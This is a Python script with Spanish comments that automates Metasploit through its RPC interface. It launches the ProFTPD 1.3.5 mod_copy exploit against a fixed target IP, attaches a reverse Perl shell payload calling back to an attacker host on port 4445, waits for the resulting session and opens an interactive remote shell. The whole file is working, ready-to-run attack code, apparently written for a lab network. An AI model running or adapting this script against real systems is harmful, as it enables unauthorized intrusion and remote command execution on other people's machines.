from pymetasploit3.msfrpc import MsfRpcClient
import time

def connect_metasploit():
    """Establece una conexión con el servidor de Metasploit usando credenciales predeterminadas.

    Returns:
        MsfRpcClient: Una instancia del cliente conectado a Metasploit.
    """
    client = MsfRpcClient("password", ssl=True)
    print("Conectado a Metasploit!")
    return client

def search_exploits(client, keyword):
    """Busca en los módulos de exploits disponibles aquellos que contengan una palabra clave específica.

    Args:
        client (MsfRpcClient): El cliente de Metasploit.
        keyword (str): Palabra clave para filtrar los exploits.

    Returns:
        None: Imprime los nombres de los exploits encontrados.
    """
    exploits = client.modules.exploits
    filtered_exploits = [exploit for exploit in exploits if keyword.lower() in exploit.lower()]
    print(f"Exploits que contienen '{keyword}':")
    for exploit in filtered_exploits:
        print(exploit)

def setup_and_run_exploit(client):
    """Configura y ejecuta un exploit específico para ProFTPD 1.3.5.

    Args:
        client (MsfRpcClient): El cliente de Metasploit.

    Returns:
        str: El UUID del exploit ejecutado.
    """
    exploit = client.modules.use("exploit", "unix/ftp/proftpd_modcopy_exec")

    exploit['RHOSTS'] = '192.168.138.137'
    exploit['SITEPATH'] = '/var/www/html'

    payload = client.modules.use('payload', 'cmd/unix/reverse_perl')
    payload['LHOST'] = '192.168.138.135'
    payload['LPORT'] = 4445

    print("Ejecutando el exploit...")
    output = exploit.execute(payload=payload)
    print(output)

    return output['uuid']

def get_session_id(client, uuid, timeout=15):
    """Monitoriza las sesiones activas hasta obtener el ID de la sesión relacionada con un UUID de exploit dado.

    Args:
        client (MsfRpcClient): El cliente de Metasploit.
        uuid (str): UUID del exploit ejecutado.
        timeout (int): Tiempo en segundos antes de abandonar la búsqueda.

    Returns:
        str | None: El ID de la sesión si está disponible, None si no se encuentra.
    """
    end_time = time.time() + timeout
    while time.time() < end_time:
        sessions = client.sessions.list
        for session_id in sessions:
            if sessions[session_id]['exploit_uuid'] == uuid:
                return session_id
        time.sleep(1)
    return None

def interact_with_session(client, session_id):
    """Inicia una shell interactiva con una sesión específica.

    Args:
        client (MsfRpcClient): El cliente de Metasploit.
        session_id (str): El ID de la sesión a interactuar.

    Returns:
        None: Mantiene la sesión interactiva hasta que el usuario decide salir.
    """
    shell = client.sessions.session(session_id)
    print("Interactuando con la sesión...")

    try:
        while True:
            command = input("$ ")
            if command.lower() == 'exit':
                break
            shell.write(command + '\n')
            time.sleep(1)  # Dar tiempo para la respuesta
            print(shell.read())
    except KeyboardInterrupt:
        print("Saliendo de la sesión interactiva.")

def main():
    client = connect_metasploit()
    job_id = setup_and_run_exploit(client)
    session_id = get_session_id(client, job_id)
    
    if session_id:
        print(f"Sesión {session_id} obtenida.")
        interact_with_session(client, session_id)
    else:
        print("No se pudo obtener una sesión.")

if __name__ == "__main__":
    main()
